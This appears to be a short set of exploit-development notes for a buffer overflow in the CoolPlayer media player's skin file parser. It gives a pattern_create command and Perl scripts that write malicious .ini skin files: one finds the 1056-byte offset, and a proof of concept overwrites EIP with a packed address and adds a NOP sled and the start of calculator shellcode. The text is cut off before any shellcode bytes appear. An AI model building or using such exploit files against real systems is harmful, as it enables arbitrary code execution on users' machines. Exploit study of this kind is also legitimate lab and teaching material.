## Code

### Pattern Generation

*note: navigate to ```C:\cmd``` in cmd line*

```pattern_create 3000 > "C:\Documents and Settings\Administrator\Desktop\pattern.txt"```

### Perl

#### pattern.pl

```perl
my $file="pattern.ini"; # file name
my $header="[CoolPlayer Skin]\nPlaylistSkin="; # file header
    # pattern from pattern generation
my $pattern = "";

open($FILE,">$file");
print $FILE $header.$pattern;
close($FILE);
```

### postCrash.pl

```perl
my $file="postCrash.ini"; # file name
my $header="[CoolPlayer Skin]\nPlaylistSkin="; # file header
            # we know the offset is at 1056
my $pattern = "A" x 1056;
$pattern .= "B" x 4;
$pattern .= "C" x 4;

open($FILE,">$file");
print $FILE $header.$pattern;
close($FILE);
```

### proofofConcept.pl

```perl
my $file="proofofConcept.ini"; # file name
my $header="[CoolPlayer Skin]\nPlaylistSkin="; # file header
            # we know the offset is at 1056
my $pattern = "A" x 1056;
my $eip = pack('V',0x769ecf49); # eip
my $nopeslide = "\x90" x 16;
my $shellcode =                            #calculator code
